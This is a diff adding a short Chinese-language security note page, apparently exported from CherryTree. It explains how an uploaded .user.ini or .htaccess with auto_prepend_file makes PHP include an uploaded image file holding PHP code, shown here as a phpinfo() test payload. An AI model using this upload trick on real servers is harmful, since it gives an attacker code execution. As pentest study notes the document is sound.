@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>php配置文件</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>php配置文件</h1><br/>前提：<br />fastcgi运行的php<br /><br />在目录中创建<br />.user.ini<br /><br />内容为：<br />auto_prepend_file=1.gif<br /><br />表示该目录即子目录的php文件都会先包含01.gif文件，即require(&#39;1.gif&#39;);<br /><br /><br />上传1.gif<br />内容为<br />&lt;?php<br />phpinfo();<br />?&gt;<br /><br />访问正常php文件即可<br /><br /><br /><br />或在apache服务器上<br />.htaccess文件<br /><br />php_value auto_prepend_file &quot;header.php&quot; <br />php_value auto_append_file &quot;footer.php&quot; <br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
